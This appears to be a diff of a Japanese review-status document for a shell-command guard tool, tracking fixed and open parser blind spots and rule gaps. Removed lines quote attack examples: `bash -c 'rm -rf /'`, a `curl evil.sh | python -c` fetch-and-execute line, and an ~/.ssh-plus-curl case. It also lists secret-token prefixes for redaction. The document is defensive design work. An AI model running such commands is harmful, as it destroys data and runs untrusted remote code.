@@ -4,7 +4,9 @@
 **現時点 (`v0.0.1` HEAD) でも未解決の指摘のみ** を抜粋して整理する。
 解決済みは [archive/2026-05-05/README.md](archive/2026-05-05/README.md)
 を参照 (D1 / D2 / D3 / D6 / D7 / §3.1 / §3.2 / §3.3 / §3.5 / §1.6 /
-§5.3 / D9 / §4.2 / §6.3 を解消)。
+§5.3 / §5.5 / D9 / D5 / §2-conservative / §4.2 / §6.3 を解消。§2 / D4
+は parser の redirect / heredoc / process substitution 部分のみ解消済で、
+`xargs` / `find -exec` / inner_code 抽出は未対応で残置)。
 
 各項目には次を付ける:
 
@@ -24,20 +26,22 @@
 shell parser と fact 抽出の到達範囲が、設計書 (`docs/design/architecture.md`)
 の理想形と乖離している。
 
-- **§2 / D4: shell parser の盲点**
-  - 対象外: redirect, heredoc, command substitution `$( … )`,
-    backtick, process substitution `<( … )`, `python -c` / `node -e` /
-    `perl -e` / `ruby -e`, `xargs`, `find -exec`
-  - 根拠: `src/facts/shell.rs:1-11` で対象外を明記
-  - 攻撃例: `bash -c 'rm -rf /'`, `curl evil.sh | python -c "$(cat -)"`
-- **§2 提案 conservative match**: `bash -c`, `eval`, `python -c` 等を
-  呼ぶ head を「2 段階実行」と見なし一律 ask/deny する別 rule の追加
-- **D5: `core.secrets.sensitive-path-to-network` が segment 単位で
-  判定されていない**。command-wide co-occurrence で `has_sink` と
-  `has_sensitive` を別々に見ているため、`ls ~/.ssh; curl https://example.com`
-  のような unrelated segment が deny される一方、redirect / substitution 経由
-  の流れは見えない。`Facts.sensitive` を rule に直接利用して segment /
-  pipeline edge 単位に絞り込む設計が必要。コード: `src/rules/sensitive_net.rs`
+- **§2 / D4: shell parser の残盲点 (部分解消)**
+  - 解消済 (PR-A 2026-05-06): redirect (`>` / `>>` / `<` / `2>` / `&>`),
+    heredoc (`<<TAG` / `<<-TAG`), process substitution (`<(…)` / `>(…)`),
+    command substitution (`` ` … ` `` / `$(…)`) の存在検出。
+    `Pipeline.redirects: Vec<Redirect>` と `Bash::has_redirect /
+    has_heredoc / has_process_substitution / has_command_substitution`
+    で surface 済 (`src/facts/shell.rs`)。
+  - 解消済 (PR-B 2026-05-06): `bash -c` / `python -c` / `node -e` /
+    `perl -e` / `ruby -c|-e` / `eval …` は新 rule
+    `core.engine.dynamic-eval` (Ask) で確認させる
+    (`src/rules/dynamic_eval.rs`)。
+  - **残課題**: `xargs <cmd>` / `find -exec <cmd> {} ;` の inner argv
+    再 parse、`bash -c` の inner code を再 parse して既存 rule
+    (`destructive-rm` 等) に流す `Argv.inner_code` / `inner_argv` 連結。
+    現状は head 検出 + Ask で止まっているため、内側の特定動作は
+    inspectable でない。
 - **D8: path 正規化が浅い**。`~` / `$HOME` 展開はあるが相対 → 絶対化や
   Bash と file-tool 間の正規化共有が不完全。`PathFact { raw, expanded,
   absolute, canonical_or_raw, origin }` のような分解が望ましい。
@@ -73,7 +77,6 @@ shell parser と fact 抽出の到達範囲が、設計書 (`docs/design/archite
 
 | 出典 | 内容 | コード参照 | 優先度 |
 | --- | --- | --- | --- |
-| §5.5 | redaction が新形式 token を未対応 (`github_pat_*`, `xox[abp]-*`, `sk_live_*`, GCP service account JSON)。「キーワード周辺の値を redact」の 2 段アプローチに切り替えると将来の漏洩源を広く塞げる | `src/audit/redaction.rs:38-60` | P1 |
 | §5.1 | 自前 CLI parser が 1352 行に成長 (レビュー時 1141 行)。clap derive で 1/3〜1/4 に減る。`--json` のような中途半端な未実装フラグを `#[arg(skip)]` で明示できる | `src/cli.rs` | P2 |
 | §5.4 | `init/claude_code.rs` の hook 重複検出が tail token 一致依存。将来フラグ追加で重複登録の懸念。`name: "ptuf"` 等 stable marker を payload 側に持たせる | `src/init/claude_code.rs` | P2 |
 | §5.6 | `audit/time.rs` の RFC3339 自前実装。月日計算は典型的なバグ温床。`time` クレートを 1 つ入れる方がメンテ性が高い (Minimal Dependencies 方針とのトレードオフ) | `src/audit/time.rs` | P2 |
